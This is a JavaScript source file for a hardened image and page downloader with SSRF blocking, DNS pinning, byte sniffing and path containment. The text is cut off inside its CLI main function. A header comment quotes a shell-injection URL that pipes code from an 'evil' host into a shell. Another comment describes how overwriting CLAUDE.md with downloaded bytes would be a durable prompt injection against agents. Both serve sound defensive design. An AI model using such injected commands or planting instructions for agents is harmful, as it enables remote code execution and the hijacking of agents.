#!/usr/bin/env node
// _fetch-asset.mjs — hardened download-first helper behind `maude design
// fetch-asset` (DDR-062 dispatch; DDR-147 § Security follow-up item 1).
//
// WHY THIS EXISTS: the moodboard (`/design:setup-ds` Stage 3) and DS specimens
// fill photo slots with imagery the research pass harvests off the web. An
// external `<img src="https://…">` hotlink is blocked by the canvas iframe CSP
// (`img-src 'self' data: blob:`, ALWAYS on under the default DDR-054 origin
// split) and is browser-context-flaky even where it isn't — so DDR-147 made
// download-first the rule: fetch to a LOCAL asset, reference the local path.
// But the download is a confused-deputy sink: every `reference_images[].url`
// is ATTACKER-CONTROLLED (it came from a page the research pass ingested) and
// `<designRoot>/assets/` is VERSIONED (it commits + syncs to peers, DDR-054).
// So this helper is the ONE reviewable place that does the fetch safely:
//
//   • fixed, non-interpolated curl args — the URL is passed as a single argv
//     element after `--`, never spliced into a shell string (closes the
//     `https://x/a.png";curl evil|sh;"` shell-injection RCE that a hand-authored
//     prose `curl` recipe transcribed by an agent would open),
//   • https-only, no redirects, size + time caps, no-proxy,
//   • a RESOLVED-IP SSRF gate (reject loopback / link-local / RFC-1918 / CGNAT /
//     multicast / reserved, v4 AND v6, incl. IPv4-mapped + NAT64 embeds) with
//     DNS PINNING via `--resolve` so a rebinding TOCTOU can't swap a validated
//     public IP for 169.254.169.254 between the check and the connect,
//   • a magic-byte image sniff (png/jpg/gif/webp; SVG/HTML/script → reject),
//   • a content-addressed `<sha8>.<ext>` filename (`[a-z0-9._-]` only) written
//     FLAT under `<designRoot>/assets/` with a realpath containment assertion —
//     mirroring the `/_api/asset` route's convention so the reference form
//     `/assets/<sha8>.<ext>` serves on BOTH the main and the segregated canvas
//     origin (the nested `assets/moodboard/<ds>/` layout 404'd on the canvas
//     origin's flat-only `/assets/` gate — the second half of the bug this fixes).
//
// Reached via `maude design fetch-asset <url> --root <repo>`, never a raw path.
// stdout on success = the canvas reference path (one line), so the caller can do
//   REF=$(maude design fetch-asset "$URL" --root "$REPO") && <use $REF> || <scrap>
// Exit: 0 ok · 2 usage · 3 SSRF/validation reject · 4 download/http error ·
//       5 unsupported media type · 6 write/containment error · 1 other.

import { execFileSync, spawn } from 'node:child_process';
import { createHash } from 'node:crypto';
import { lookup } from 'node:dns/promises';
import { existsSync, mkdirSync, readFileSync, realpathSync, renameSync, rmSync } from 'node:fs';
import { isIP } from 'node:net';
import { basename, dirname, join, resolve, sep } from 'node:path';
import { pathToFileURL } from 'node:url';

// A real browser UA — some CDNs (wikimedia) 403 a bare curl/UA; the memory
// `canvas-images-download-first` documents this. Fixed string, never templated.
const BROWSER_UA =
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

// Images keep the tighter 10 MB cap (mirrors api.ts ASSET_MAX_BYTES for the
// image category). Override for a giant hero via --max-bytes.
const DEFAULT_MAX_BYTES = 10 * 1024 * 1024;
const DEFAULT_MAX_TIME = 20; // seconds — whole transfer

// ── IPv4 ───────────────────────────────────────────────────────────────────

/** Parse a dotted-quad into a 4-byte array, or null if not a valid IPv4. */
export function parseIPv4(str) {
  if (typeof str !== 'string') return null;
  const parts = str.split('.');
  if (parts.length !== 4) return null;
  const bytes = new Uint8Array(4);
  for (let i = 0; i < 4; i += 1) {
    const p = parts[i];
    // No leading-zero octets (avoids octal ambiguity), digits only, 0..255.
    if (!/^\d{1,3}$/.test(p)) return null;
    if (p.length > 1 && p[0] === '0') return null;
    const n = Number(p);
    if (n > 255) return null;
    bytes[i] = n;
  }
  return bytes;
}

/**
 * Return a block-reason string if this IPv4 is a private / loopback / link-local
 * / reserved address that egress must never reach, else null (public → allowed).
 */
export function classifyIPv4(bytes) {
  const [a, b] = bytes;
  if (a === 0) return 'ipv4 0.0.0.0/8 (this-network)';
  if (a === 10) return 'ipv4 10.0.0.0/8 (private)';
  if (a === 127) return 'ipv4 127.0.0.0/8 (loopback)';
  if (a === 100 && b >= 64 && b <= 127) return 'ipv4 100.64.0.0/10 (CGNAT)';
  if (a === 169 && b === 254) return 'ipv4 169.254.0.0/16 (link-local incl. IMDS)';
  if (a === 172 && b >= 16 && b <= 31) return 'ipv4 172.16.0.0/12 (private)';
  if (a === 192 && b === 0 && bytes[2] === 0) return 'ipv4 192.0.0.0/24 (IETF)';
  if (a === 192 && b === 0 && bytes[2] === 2) return 'ipv4 192.0.2.0/24 (TEST-NET-1)';
  if (a === 192 && b === 168) return 'ipv4 192.168.0.0/16 (private)';
  if (a === 198 && (b === 18 || b === 19)) return 'ipv4 198.18.0.0/15 (benchmark)';
  if (a >= 224 && a <= 239) return 'ipv4 224.0.0.0/4 (multicast)';
  if (a >= 240) return 'ipv4 240.0.0.0/4 (reserved/broadcast)';
  return null;
}

// ── IPv6 ───────────────────────────────────────────────────────────────────

/** Parse an IPv6 string (incl. `::`, zone id, embedded IPv4) into 16 bytes. */
export function parseIPv6(str) {
  if (typeof str !== 'string') return null;
  let s = str.trim();
  const zone = s.indexOf('%');
  if (zone !== -1) s = s.slice(0, zone); // drop scope id (fe80::1%en0)

  // Embedded trailing IPv4 (::ffff:1.2.3.4 or 64:ff9b::1.2.3.4) → two hextets.
  if (s.includes('.')) {
    const idx = s.lastIndexOf(':');
    if (idx === -1) return null;
    const v4 = parseIPv4(s.slice(idx + 1));
    if (!v4) return null;
    const h1 = ((v4[0] << 8) | v4[1]).toString(16);
    const h2 = ((v4[2] << 8) | v4[3]).toString(16);
    s = `${s.slice(0, idx + 1)}${h1}:${h2}`;
  }

  const halves = s.split('::');
  if (halves.length > 2) return null;
  const head = halves[0] ? halves[0].split(':') : [];
  const tail = halves.length === 2 ? (halves[1] ? halves[1].split(':') : []) : null;

  let groups;
  if (tail === null) {
    if (head.length !== 8) return null; // no '::' ⇒ must be exactly 8 groups
    groups = head;
  } else {
    const missing = 8 - (head.length + tail.length);
    if (missing < 1) return null; // '::' must stand for ≥1 zero group
    groups = [...head, ...Array(missing).fill('0'), ...tail];
  }
  if (groups.length !== 8) return null;

  const bytes = new Uint8Array(16);
  for (let i = 0; i < 8; i += 1) {
    const g = groups[i];
    if (!/^[0-9a-fA-F]{1,4}$/.test(g)) return null;
    const v = Number.parseInt(g, 16);
    bytes[i * 2] = (v >> 8) & 0xff;
    bytes[i * 2 + 1] = v & 0xff;
  }
  return bytes;
}

/** Block-reason for an IPv6 (16 bytes), or null if public/allowed. */
export function classifyIPv6(bytes) {
  const b = bytes;
  const allZeroThrough = (n) => b.slice(0, n).every((x) => x === 0);

  if (allZeroThrough(16)) return 'ipv6 :: (unspecified)';
  if (allZeroThrough(15) && b[15] === 1) return 'ipv6 ::1 (loopback)';
  if (b[0] === 0xfe && (b[1] & 0xc0) === 0x80) return 'ipv6 fe80::/10 (link-local)';
  if ((b[0] & 0xfe) === 0xfc) return 'ipv6 fc00::/7 (unique-local)';
  if (b[0] === 0xff) return 'ipv6 ff00::/8 (multicast)';

  // IPv4-mapped ::ffff:0:0/96 — classify the embedded v4 (the real target).
  if (allZeroThrough(10) && b[10] === 0xff && b[11] === 0xff) {
    const reason = classifyIPv4(b.slice(12, 16));
    return reason ? `ipv4-mapped ${reason}` : null;
  }
  // NAT64 well-known prefix 64:ff9b::/96 — classify the embedded v4 too.
  if (
    b[0] === 0x00 &&
    b[1] === 0x64 &&
    b[2] === 0xff &&
    b[3] === 0x9b &&
    allZeroThroughRange(b, 4, 12)
  ) {
    const reason = classifyIPv4(b.slice(12, 16));
    return reason ? `nat64 ${reason}` : null;
  }
  return null;
}

function allZeroThroughRange(b, from, to) {
  for (let i = from; i < to; i += 1) if (b[i] !== 0) return false;
  return true;
}

/**
 * Classify any IP literal string. Returns a block-reason (truthy) if egress to
 * it is forbidden, null if allowed, and 'unparseable address' if it isn't a
 * valid IP (fail-closed — the caller rejects on any non-null).
 */
export function classifyAddress(addr) {
  const kind = isIP(addr);
  if (kind === 4) {
    const bytes = parseIPv4(addr);
    return bytes ? classifyIPv4(bytes) : 'unparseable ipv4';
  }
  if (kind === 6) {
    const bytes = parseIPv6(addr);
    return bytes ? classifyIPv6(bytes) : 'unparseable ipv6';
  }
  return 'not an ip address';
}

// ── URL target ───────────────────────────────────────────────────────────────

/**
 * Validate the URL is a plain https target and pull out {host, port}. Throws a
 * FetchAssetError (code 3) on anything else — non-https scheme, embedded
 * credentials, missing host.
 */
export function parseHttpsTarget(rawUrl, opts = {}) {
  let u;
  try {
    u = new URL(rawUrl);
  } catch {
    throw new FetchAssetError(3, `not a valid URL: ${truncate(rawUrl)}`);
  }
  if (u.protocol !== 'https:') {
    throw new FetchAssetError(3, `only https:// is allowed (got ${u.protocol}//)`);
  }
  if (u.username || u.password) {
    throw new FetchAssetError(3, 'URLs with embedded credentials are refused');
  }
  const host = u.hostname;
  if (!host) throw new FetchAssetError(3, 'URL has no host');
  const port = u.port ? Number(u.port) : 443;
  if (!Number.isInteger(port) || port < 1 || port > 65535) {
    throw new FetchAssetError(3, `bad port ${u.port}`);
  }
  // DDR-216 D4 — an OPTIONAL host allowlist, at the gate rather than at the
  // caller. Absent (the default) = today's unrestricted behaviour, so the
  // existing moodboard/research callers are untouched. The Figma lane always
  // passes it.
  //
  // Matching is exact-or-DOTTED-SUFFIX, never a bare `endsWith`: `endsWith(
  // 'figma.com')` admits `evil-figma.com`, and `endsWith('.amazonaws.com')`
  // admits every S3 bucket on earth.
  //
  // This is a REACH control (which endpoint), never a CONTENT control — the
  // Figma render bucket is a SHARED object store any account can write into,
  // so the byte-level sniff below is what actually protects the tree. And it
  // NARROWS the IP gate, never replaces it: an allowlisted hostname that
  // resolves to 127.0.0.1 is still refused by `resolveSafeIp`.
  if (opts.allowHosts?.length) {
    const h = host.toLowerCase();
    const ok = opts.allowHosts.some((suffix) => {
      const s = String(suffix).toLowerCase().replace(/^\./, '');
      return h === s || h.endsWith(`.${s}`);
    });
    if (!ok) throw new FetchAssetError(3, `host not in this lane's allowlist: ${safeHostLabel(h)}`);
  }
  // DDR-216 D4 — the Figma lane pins 443. Named as NEW logic rather than
  // assumed: this function accepts 1–65535 by default and always has.
  if (opts.pinPort443 && port !== 443) {
    throw new FetchAssetError(3, `this lane requires port 443 (got ${port})`);
  }
  return { host, port };
}

/**
 * A hostname reduced to a charset-validated token before it can be printed.
 *
 * DDR-216 D10: this verb's output is read BY an agent, so an upstream-controlled
 * string must never appear verbatim in a message. A DNS label charset is narrow
 * enough to be safe and specific enough to diagnose.
 */
function safeHostLabel(host) {
  const cleaned = String(host)
    .toLowerCase()
    .replace(/[^a-z0-9.-]/g, '');
  return cleaned.slice(0, 253) || '(unprintable)';
}

/**
 * The `--raw-out` accept set: everything `sniffImageExt` accepts, PLUS SVG.
 *
 * `sniffImageExt` is deliberately NOT modified — it is the type gate the
 * moodboard lane depends on, and a standing test asserts it still returns null
 * for `<svg`/`<?xml`. The SVG probe below reuses the exact leading-token shape
 * `_import-asset.mjs`'s own `svgPreParseReject` uses, so a payload accepted here
 * is one that lane will actually attempt to parse (and then sanitize).
 */
export function sniffStagedKind(bytes) {
  const raster = sniffImageExt(bytes);
  if (raster) return raster;
  // Text probe on the first bytes only — never decode the whole body to guess.
  const head = Buffer.from(bytes.subarray(0, 256)).toString('utf8');
  // Deliberately NARROWER than `svgPreParseReject`'s own leading-token set: a
  // bare `<!--` prologue is legal SVG but it is also what lets an arbitrary text
  // payload masquerade as one (review F2), and no Figma export starts with it.
  // The full DDR-167 lane still validates properly downstream.
  return /^\s*(<\?xml|<svg)/i.test(head) ? 'svg' : null;
}

// ── image sniff + naming ─────────────────────────────────────────────────────

/**
 * Magic-byte sniff — png/jpg/gif/webp only. Mirrors api.ts sniffImageType so
 * this lane and the /_api/asset route agree. SVG (XML text) matches nothing →
 * null → rejected, so a script-bearing vector can't ride in as an "image".
 * Bytes decide the extension; the URL/Content-Type is never trusted.
 */
export function sniffImageExt(b) {
  if (
    b.length >= 8 &&
    b[0] === 0x89 &&
    b[1] === 0x50 &&
    b[2] === 0x4e &&
    b[3] === 0x47 &&
    b[4] === 0x0d &&
    b[5] === 0x0a &&
    b[6] === 0x1a &&
    b[7] === 0x0a
  ) {
    return 'png';
  }
  if (b.length >= 3 && b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff) return 'jpg';
  if (
    b.length >= 6 &&
    b[0] === 0x47 &&
    b[1] === 0x49 &&
    b[2] === 0x46 &&
    b[3] === 0x38 &&
    (b[4] === 0x37 || b[4] === 0x39) &&
    b[5] === 0x61
  ) {
    return 'gif';
  }
  if (
    b.length >= 12 &&
    b[0] === 0x52 &&
    b[1] === 0x49 &&
    b[2] === 0x46 &&
    b[3] === 0x46 &&
    b[8] === 0x57 &&
    b[9] === 0x45 &&
    b[10] === 0x42 &&
    b[11] === 0x50
  ) {
    return 'webp';
  }
  return null;
}

/** Content-addressed name `<sha8>.<ext>` — same shape the /_api/asset route uses. */
export function assetName(bytes, ext) {
  const sha8 = createHash('sha256').update(bytes).digest('hex').slice(0, 8);
  const name = `${sha8}.${ext}`;
  // Defense-in-depth: the shape is machine-generated, but assert the charset
  // contract the untrusted-fetch rails promise (`[a-z0-9._-]`, no path segment).
  if (!/^[a-z0-9]{8}\.(png|jpg|gif|webp)$/.test(name)) {
    throw new FetchAssetError(6, `generated name failed the charset contract: ${name}`);
  }
  return name;
}

/**
 * Resolve `<root>/<designRootRel>/assets/<name>` and assert it stays inside the
 * assets dir (realpath containment — poisoned designRoot / traversal backstop).
 */
export function containedAssetPath(root, designRootRel, name) {
  const rootAbs = resolve(root);
  const assetsDir = resolve(rootAbs, designRootRel, 'assets');
  if (assetsDir !== rootAbs && !assetsDir.startsWith(rootAbs + sep)) {
    throw new FetchAssetError(6, `assets dir escapes root: ${assetsDir}`);
  }
  const fileAbs = resolve(assetsDir, name);
  if (fileAbs !== join(assetsDir, name) || !fileAbs.startsWith(assetsDir + sep)) {
    throw new FetchAssetError(6, `resolved asset path escapes assets dir: ${fileAbs}`);
  }
  return { assetsDir, fileAbs };
}

// S8.18 — a refusal's KIND, so a caller can word it without parsing the message (and without
// echoing anything the remote said): refused (the gate said no) · redirect (too many hops) ·
// timeout · unreachable · http (a non-200 status) · size · type.
const KIND_BY_CODE = { 2: 'usage', 3: 'refused', 4: 'unreachable', 5: 'type', 6: 'write' };

export class FetchAssetError extends Error {
  constructor(code, message, kind) {
    super(message);
    this.code = code;
    this.kind = kind ?? KIND_BY_CODE[code] ?? 'other';
  }
}

function truncate(s, n = 120) {
  const str = String(s);
  return str.length > n ? `${str.slice(0, n)}…` : str;
}

// ── network (impure) ─────────────────────────────────────────────────────────

/**
 * Resolve the host to IPs, reject if ANY is internal (conservative — a host that
 * also resolves to an internal IP is treated as hostile, defeating a mixed
 * public/internal rebinding answer), and return the public IP to pin to.
 */
export async function resolveSafeIp(host, lookupFn = lookup) {
  // An IP literal host is classified directly — no DNS. `URL.hostname` keeps an IPv6 literal's
  // brackets (`[::1]`), which `isIP` does not recognise: unbracketed it is classified as the
  // address it is (S8.18 — it used to fall through to a DNS lookup that failed closed, so it was
  // refused, but as "DNS failed" rather than as the private address it names).
  const bare = /^\[[^\]]*\]$/.test(host) ? host.slice(1, -1) : host;
  if (isIP(bare)) {
    const reason = classifyAddress(bare);
    if (reason) throw new FetchAssetError(3, `blocked address ${bare} — ${reason}`);
    return bare;
  }
  let records;
  try {
    records = await lookupFn(host, { all: true, verbatim: true });
  } catch (err) {
    throw new FetchAssetError(
      3,
      `DNS resolution failed for ${safeHostLabel(host)}: ${safeHostLabel(err?.code ?? 'error')}`,
      'unreachable'
    );
  }
  if (!records.length)
    throw new FetchAssetError(3, `no DNS records for ${safeHostLabel(host)}`, 'unreachable');
  for (const { address } of records) {
    const reason = classifyAddress(address);
    if (reason) throw new FetchAssetError(3, `${host} resolves to blocked ${address} — ${reason}`);
  }
  return records[0].address;
}

/**
 * Download <url> to <tmpAbs> with the hardened, fixed curl args, pinning the
 * connection to the pre-validated <pinIp> so no re-resolution (rebinding) can
 * occur. Returns nothing; throws FetchAssetError(4) on any non-200 / transport
 * failure. The URL is the LAST argv element after `--` — never interpolated.
 */
export function curlDownload({ url, host, port, pinIp, tmpAbs, maxBytes, maxTime }) {
  const args = [
    '--proto',
    '=https',
    '--proto-redir',
    '=https',
    '--max-redirs',
    '0', // no redirects — blocks redirect-to-internal SSRF
    '--max-filesize',
    String(maxBytes),
    '--max-time',
    String(maxTime),
    '--connect-timeout',
    String(Math.min(maxTime, 10)),
    '--noproxy',
    '*', // ignore *_PROXY env — no egress via a poisoned proxy
    '-sS',
    '-A',
    BROWSER_UA,
    '--resolve',
    `${host}:${port}:${pinIp}`, // pin — defeats DNS rebinding
    '-o',
    tmpAbs,
    '-w',
    '%{http_code}',
    '--',
    url,
  ];
  let httpCode;
  try {
    httpCode = execFileSync('curl', args, {
      encoding: 'utf8',
      timeout: (maxTime + 5) * 1000,
      maxBuffer: 1024 * 1024,
    }).trim();
  } catch (err) {
    throw new FetchAssetError(4, `curl failed: ${err?.message ?? err}`);
  }
  if (httpCode !== '200') {
    throw new FetchAssetError(
      4,
      `server returned HTTP ${httpCode || '(none)'} (redirects disabled)`
    );
  }
}

// ── text pages, hop by hop (S8.18) ───────────────────────────────────────────
//
// The brand import reads a website the person typed: its HTML and a few of its stylesheets. A
// website is the first caller that must FOLLOW redirects (apex → www, / → /en/), and a redirect is
// exactly how an SSRF reaches an internal address the first URL never named. So curl still never
// follows one (`--max-redirs 0`); this loop does, and every hop is a fresh, FULL gate pass — https
// only, no credentials, the caller's port pin and host allowlist, every resolved address public,
// and the connection pinned to the address that was checked. One time budget spans every hop; the
// body is capped while it streams (curl's own --max-filesize is blind to a chunked body).
//
// The result is BYTES for a parser, never text for a model (DDR-173): the caller extracts typed
// values from it and drops the rest. Error messages carry no remote-controlled text — a status
// number, a charset-cleaned host label, never a body or a header.

export const REDIRECT_STATUSES = new Set([301, 302, 303, 307, 308]);
const DEFAULT_TEXT_MAX_BYTES = 2 * 1024 * 1024;
const DEFAULT_MAX_HOPS = 3;
const WRITE_OUT_TAG = 'MAUDE-W';

/** The fixed curl argv for one hop of a text read. The URL is the last element, after `--`. */
export function curlTextArgs({ url, host, port, pinIp, maxBytes, maxTime, accept }) {
  const pin = isIP(pinIp) === 6 ? `[${pinIp}]` : pinIp;
  return [
    '--proto',
    '=https',
    '--proto-redir',
    '=https',
    '--max-redirs',
    '0', // the gate follows redirects itself, re-checking every hop
    '--max-filesize',
    String(maxBytes),
    '--max-time',
    String(maxTime),
    '--connect-timeout',
    String(Math.min(maxTime, 10)),
    '--noproxy',
    '*',
    '-sS',
    '-A',
    BROWSER_UA,
    '-H',
    `Accept: ${accept.join(', ')}`,
    '--resolve',
    `${host}:${port}:${pin}`,
    '-o',
    '-',
    '-w',
    `%{stderr}\n${WRITE_OUT_TAG}\t%{http_code}\t%{content_type}\t%{redirect_url}\n`,
    '--',
    url,
  ];
}

const CURL_EXIT_KIND = { 28: 'timeout', 63: 'size', 6: 'unreachable', 7: 'unreachable' };

/** One hop over real curl: `{ status, contentType, location, body }`. Never follows a redirect. */
export function curlText(hop) {
  const { maxBytes, maxTime } = hop;
  return new Promise((resolvePromise, reject) => {
    let child;
    try {
      child = spawn('curl', curlTextArgs(hop), { stdio: ['ignore', 'pipe', 'pipe'] });
    } catch {
      reject(new FetchAssetError(4, 'curl could not start', 'unreachable'));
      return;
    }
    const chunks = [];
    let size = 0;
    let over = false;
    let err = '';
    const killer = setTimeout(() => child.kill('SIGKILL'), (maxTime + 5) * 1000);
    child.stdout.on('data', (c) => {
      size += c.length;
      if (size > maxBytes) {
        over = true;
        child.kill('SIGKILL');
        return;
      }
      chunks.push(c);
    });
    child.stderr.on('data', (c) => {
      if (err.length < 16_384) err += c.toString('utf8');
    });
    child.on('error', () => {
      clearTimeout(killer);
      reject(new FetchAssetError(4, 'curl could not start', 'unreachable'));
    });
    child.on('close', (exit) => {
      clearTimeout(killer);
      if (over) {
        reject(new FetchAssetError(4, `the page is over ${maxBytes} bytes`, 'size'));
        return;
      }
      const line = err
        .split('\n')
        .reverse()
        .find((l) => l.startsWith(`${WRITE_OUT_TAG}\t`));
      if (exit !== 0) {
        const kind = CURL_EXIT_KIND[exit] ?? 'unreachable';
        reject(new FetchAssetError(4, `the site could not be read (curl exit ${exit})`, kind));
        return;
      }
      const [, code = '', contentType = '', location = ''] = (line ?? '').split('\t');
      resolvePromise({
        status: Number(code) || 0,
        contentType,
        location,
        body: Buffer.concat(chunks),
      });
    });
  });
}

/**
 * Read one text resource (a page, a stylesheet) through the gate, following at most `maxHops`
 * redirects, each re-checked. `accept` is the list of base media types the final answer may have.
 * Returns `{ url, host, contentType, text }` (the final URL). Throws FetchAssetError with a `kind`.
 * `deps` (`lookup`, `transport`) exist for the tests; production uses DNS + curl.
 */
export async function fetchPublicText({
  url,
  maxBytes = DEFAULT_TEXT_MAX_BYTES,
  maxTime = DEFAULT_MAX_TIME,
  maxHops = DEFAULT_MAX_HOPS,
  accept = ['text/html', 'application/xhtml+xml'],
  allowHosts,
  pinPort443 = false,
  deps = {},
}) {
  const lookupFn = deps.lookup ?? lookup;
  const transport = deps.transport ?? curlText;
  const deadline = Date.now() + maxTime * 1000;
  let current = url;
  for (let hop = 0; ; hop += 1) {
    // EVERY hop: scheme, credentials, port pin, allowlist, then every resolved address.
    const { host, port } = parseHttpsTarget(current, { allowHosts, pinPort443 });
    const pinIp = await resolveSafeIp(host, lookupFn);
    const left = Math.floor((deadline - Date.now()) / 1000);
    if (left < 1) throw new FetchAssetError(4, `no answer within ${maxTime} s`, 'timeout');
    const r = await transport({ url: current, host, port, pinIp, maxBytes, maxTime: left, accept });
    if (REDIRECT_STATUSES.has(r.status)) {
      if (hop >= maxHops) {
        throw new FetchAssetError(3, `more than ${maxHops} redirects`, 'redirect');
      }
      if (!r.location) throw new FetchAssetError(4, `HTTP ${r.status} without a target`, 'http');
      let next;
      try {
        next = new URL(r.location, current).href;
      } catch {
        throw new FetchAssetError(3, 'a redirect to an unreadable address', 'refused');
      }
      current = next;
      continue;
    }
    if (r.status !== 200) {
      throw new FetchAssetError(4, `HTTP ${Number(r.status) || 0}`, 'http');
    }
    const base = String(r.contentType || '')
      .split(';')[0]
      .trim()
      .toLowerCase();
    if (!accept.includes(base)) {
      throw new FetchAssetError(5, `not ${accept.join(' / ')}`, 'type');
    }
    const body = Buffer.isBuffer(r.body) ? r.body : Buffer.from(r.body ?? '');
    if (body.length > maxBytes) {
      throw new FetchAssetError(4, `the page is over ${maxBytes} bytes`, 'size');
    }
    if (body.includes(0)) throw new FetchAssetError(5, 'a binary body', 'type');
    return { url: current, host, contentType: base, text: body.toString('utf8') };
  }
}

// ── orchestration ────────────────────────────────────────────────────────────

/**
 * Full fetch: validate URL → SSRF-gate the resolved IP → download pinned →
 * sniff → content-address → contain → write. Returns
 * { ref, path, name, bytes, ext }. Throws FetchAssetError with a .code.
 */
export async function fetchAsset({
  url,
  root,
  designRootRel = '.design',
  maxBytes = DEFAULT_MAX_BYTES,
  maxTime = DEFAULT_MAX_TIME,
  allowHosts,
  pinPort443 = false,
  rawOut = null,
  rawRoot = null,
}) {
  const { host, port } = parseHttpsTarget(url, { allowHosts, pinPort443 });
  const pinIp = await resolveSafeIp(host);

  // ── `--raw-out` (DDR-216 D11) ──────────────────────────────────────────────
  //
  // Download under the FULL network gate (IP classification, DNS pin, redirect
  // ban, size/time caps, host allowlist) but write to a CALLER-SUPPLIED path
  // instead of `assets/`, and do NOT content-address or name the file.
  //
  // Why this exists: D11 composes two already-reviewed gates rather than
  // widening one. A Figma vector export is an SVG, and this helper's raster-only
  // sniff is load-bearing for its OTHER caller (the DDR-147 moodboard lane,
  // where URLs are research-harvested and there is no allowlist at all). So the
  // Figma lane stages the bytes here and hands them to `_import-asset.mjs`'s
  // DDR-167 SVG lane (allowlist DOM-sanitize → SVGO validity gate) before
  // anything is named or lands in the versioned tree.
  //
  // IT STILL SNIFFS. `--raw-out` must never mean "skip the type gate" — that
  // would turn the one reviewable downloader into an unsniffed one (HTML, JS,
  // polyglots, archives) for the next caller who copies it. It sniffs against
  // an EXTENDED accept set; `sniffImageExt` itself is untouched, which is what
  // keeps the standing "sniffImageExt still rejects SVG" test literally true.
  if (rawOut) {
    // CONTAINMENT (post-implementation review F2). Without this, `--raw-out`
    // was an arbitrary-file-write primitive on the ONE helper whose whole job
    // is to be the safe downloader: `resolve()` + `renameSync()` with no root
    // relationship, no charset assertion, and a type gate a leading `<!--`
    // satisfies. An agent that can run `maude design fetch-asset` (ACP
    // default-allows `Bash(maude:*)`) could have written remote bytes over
    // `CLAUDE.md` — durable prompt injection.
    //
    // So the mode now REQUIRES the caller to declare the directory it owns, and
    // the target must resolve inside it. The Figma lane passes its per-run
    // staging dir; there is no way to express "anywhere".
    if (!rawRoot) {
      throw new FetchAssetError(2, '--raw-out requires --raw-root (the directory the caller owns)');
    }
    // BOTH sides get realpath'd, or neither. On macOS `/var` and `/tmp` are
    // themselves OS-level symlinks (`-> /private/var`, `-> /private/tmp`), so
    // realpath'ing only the root compares `/private/var/…` against `/var/…` and
    // rejects EVERY legitimate staging path — which is exactly how this shipped
    // and why the first real import skipped all 29 of its assets. Same trap
    // DDR-172 Decision 1 documents for its own symlink check.
    //
    // The target does not exist yet, so realpath its PARENT (which does — the
    // caller made the staging dir) and rebuild the leaf onto it.
    const rootAbs = realpathSync(resolve(rawRoot));
    const requested = resolve(rawOut);
    const parentAbs = realpathSync(dirname(requested));
    const outAbs = join(parentAbs, basename(requested));
    if (outAbs !== rootAbs && !outAbs.startsWith(rootAbs + sep)) {
      throw new FetchAssetError(6, '--raw-out must resolve inside --raw-root');
    }
    // Never overwrite: a staged download is always a fresh file, so an existing
    // target means either a collision or an attempt to clobber something.
    if (existsSync(outAbs)) {
      throw new FetchAssetError(6, '--raw-out target already exists');
    }
    const tmpRaw = `${outAbs}.part`;
    try {
      curlDownload({ url, host, port, pinIp, tmpAbs: tmpRaw, maxBytes, maxTime });
      let data;
      try {
        data = readFileSync(tmpRaw);
      } catch {
        throw new FetchAssetError(4, 'download produced no file');
      }
      if (data.length === 0) throw new FetchAssetError(4, 'downloaded empty body');
      if (data.length > maxBytes) throw new FetchAssetError(4, `file exceeds ${maxBytes} bytes`);
      const kind = sniffStagedKind(data);
      if (!kind) {
        throw new FetchAssetError(5, 'not a png/jpg/gif/webp/svg payload (HTML/script rejected)');
      }
      renameSync(tmpRaw, outAbs);
      return { ref: null, path: outAbs, name: null, bytes: data.length, ext: kind };
    } finally {
      rmSync(tmpRaw, { force: true });
    }
  }

  const { assetsDir } = containedAssetPath(root, designRootRel, 'placeholder.png');
  mkdirSync(assetsDir, { recursive: true });
  const tmpAbs = join(
    assetsDir,
    `.tmp-${createHash('sha256').update(url).digest('hex').slice(0, 12)}`
  );

  try {
    curlDownload({ url, host, port, pinIp, tmpAbs, maxBytes, maxTime });

    let data;
    try {
      data = readFileSync(tmpAbs);
    } catch {
      throw new FetchAssetError(4, 'download produced no file');
    }
    if (data.length === 0) throw new FetchAssetError(4, 'downloaded empty body');
    if (data.length > maxBytes) throw new FetchAssetError(4, `file exceeds ${maxBytes} bytes`);

    const ext = sniffImageExt(data);
    if (!ext) {
      throw new FetchAssetError(5, 'not a png/jpg/gif/webp image (SVG/HTML/script rejected)');
    }

    const name = assetName(data, ext);
    const { fileAbs } = containedAssetPath(root, designRootRel, name);
    // Dedupe — identical bytes hash to the same name.
    if (existsSync(fileAbs)) {
      rmSync(tmpAbs, { force: true });
    } else {
      renameSync(tmpAbs, fileAbs);
    }
    return { ref: `/assets/${name}`, path: `assets/${name}`, name, bytes: data.length, ext };
  } finally {
    rmSync(tmpAbs, { force: true });
  }
}

// ── CLI ──────────────────────────────────────────────────────────────────────

function parseArgv(argv) {
  const out = {
    url: null,
    root: null,
    designRoot: '.design',
    maxBytes: DEFAULT_MAX_BYTES,
    maxTime: DEFAULT_MAX_TIME,
    json: false,
  };
  for (let i = 0; i < argv.length; i += 1) {
    const a = argv[i];
    switch (a) {
      case '--root':
        out.root = argv[++i];
        break;
      case '--design-root':
        out.designRoot = argv[++i];
        break;
      case '--max-bytes':
        out.maxBytes = Number(argv[++i]);
        break;
      case '--max-time':
        out.maxTime = Number(argv[++i]);
        break;
      // DDR-216 D4/D11 — all three default to today's behaviour, so every
      // existing caller of this helper is untouched.
      case '--allow-host':
        if (!out.allowHosts) out.allowHosts = [];
        out.allowHosts.push(argv[++i]);
        break;
      case '--pin-port-443':
        out.pinPort443 = true;
        break;
      case '--raw-out':
        out.rawOut = argv[++i];
        break;
      case '--raw-root':
        out.rawRoot = argv[++i];
        break;
      case '--json':
        out.json = true;
        break;
      case '--help':
      case '-h':
        out.help = true;
        break;
      default:
        if (a.startsWith('-')) throw new FetchAssetError(2, `unknown flag ${a}`);
        if (out.url === null) out.url = a;
        else throw new FetchAssetError(2, `unexpected extra arg ${a}`);
    }
  }
  return out;
}

const HELP = `fetch-asset — hardened download-first image fetch (reached via \`maude design fetch-asset\`)

Usage:
  maude design fetch-asset <https-url> --root <repo> [--design-root .design]
                           [--max-bytes N] [--max-time S] [--json]

Downloads an image over https ONLY, through a resolved-IP SSRF gate + DNS pin,
sniffs the bytes (png/jpg/gif/webp; SVG/HTML rejected), content-addresses it as
<designRoot>/assets/<sha8>.<ext>, and prints the canvas reference path.

On success stdout = the reference path, e.g.  /assets/a44d3d60.png
  REF=$(maude design fetch-asset "$URL" --root "$REPO") && echo "$REF" || echo scrap

Exit: 0 ok · 2 usage · 3 SSRF/validation reject · 4 download/http error ·
      5 unsupported media type · 6 write/containment error · 1 other.`;

async function main() {
  let opts;
  try {
